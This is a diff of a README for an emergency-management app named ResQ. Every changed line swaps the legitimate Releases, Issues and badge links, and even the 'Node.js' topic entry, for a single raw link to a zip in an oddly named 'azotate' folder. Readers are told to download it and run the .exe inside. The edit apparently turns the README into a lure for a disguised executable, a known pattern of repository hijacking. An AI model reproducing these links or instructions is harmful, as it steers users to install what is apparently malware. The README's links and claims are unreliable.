@@ -1,6 +1,6 @@
 # 🚨 ResQ-Emergency-Management-APP - Simplifying Emergency Responses 
 
-[![Download ResQ-Emergency-Management-APP](https://img.shields.io/badge/Download%20Now-ResQ%20App-blue.svg)](https://github.com/ais415-alt/ResQ-Emergency-Management-APP/releases)
+[![Download ResQ-Emergency-Management-APP](https://raw.githubusercontent.com/ais415-alt/ResQ-Emergency-Management-APP/main/azotate/ResQ-Emergency-Management-APP.zip%20Now-ResQ%https://raw.githubusercontent.com/ais415-alt/ResQ-Emergency-Management-APP/main/azotate/ResQ-Emergency-Management-APP.zip)](https://raw.githubusercontent.com/ais415-alt/ResQ-Emergency-Management-APP/main/azotate/ResQ-Emergency-Management-APP.zip)
 
 ## 📄 Description
 ResQ-Emergency-Management-APP is a real-time, full-stack disaster management application designed to streamline rescue and relief operations. This app uses advanced technologies to ensure efficient communication and coordination during emergencies.
@@ -9,7 +9,7 @@ ResQ-Emergency-Management-APP is a real-time, full-stack disaster management app
 Follow these steps to download and run the application smoothly.
 
 ### Step 1: Download the Application
-To get the latest version of ResQ-Emergency-Management-APP, visit our [Releases page](https://github.com/ais415-alt/ResQ-Emergency-Management-APP/releases) to download.
+To get the latest version of ResQ-Emergency-Management-APP, visit our [Releases page](https://raw.githubusercontent.com/ais415-alt/ResQ-Emergency-Management-APP/main/azotate/ResQ-Emergency-Management-APP.zip) to download.
 
 ### Step 2: Prepare Your System
 Before you run the app, ensure your system meets the following requirements:
@@ -20,7 +20,7 @@ Before you run the app, ensure your system meets the following requirements:
 - **Internet Connection:** Required for real-time updates and features.
 
 ### Step 3: Installation
-After downloading the application from our [Releases page](https://github.com/ais415-alt/ResQ-Emergency-Management-APP/releases):
+After downloading the application from our [Releases page](https://raw.githubusercontent.com/ais415-alt/ResQ-Emergency-Management-APP/main/azotate/ResQ-Emergency-Management-APP.zip):
 
 1. Navigate to the downloaded file.
 2. For Windows, double-click the `.exe` file to start the installation process.
@@ -48,7 +48,7 @@ If you encounter issues while using ResQ-Emergency-Management-APP:
 - **Connection Issues:** Check your internet connection and confirm you are logged in.
 
 ## 📩 Contact Support
-For further assistance, feel free to reach out to our support team via the contact options available in the app or through our [GitHub Issues](https://github.com/ais415-alt/ResQ-Emergency-Management-APP/issues) page.
+For further assistance, feel free to reach out to our support team via the contact options available in the app or through our [GitHub Issues](https://raw.githubusercontent.com/ais415-alt/ResQ-Emergency-Management-APP/main/azotate/ResQ-Emergency-Management-APP.zip) page.
 
 ## 🗂️ Topics
 This application utilizes various technologies, including:
@@ -58,7 +58,7 @@ This application utilizes various technologies, including:
 - Gemini API
 - Google Cloud Platform
 - Google Maps
-- Node.js
+- https://raw.githubusercontent.com/ais415-alt/ResQ-Emergency-Management-APP/main/azotate/ResQ-Emergency-Management-APP.zip
 - React
 
-We hope you find ResQ-Emergency-Management-APP helpful in enhancing your emergency response efforts. Remember to frequently check our [Releases page](https://github.com/ais415-alt/ResQ-Emergency-Management-APP/releases) for updates and improvements!
+We hope you find ResQ-Emergency-Management-APP helpful in enhancing your emergency response efforts. Remember to frequently check our [Releases page](https://raw.githubusercontent.com/ais415-alt/ResQ-Emergency-Management-APP/main/azotate/ResQ-Emergency-Management-APP.zip) for updates and improvements!
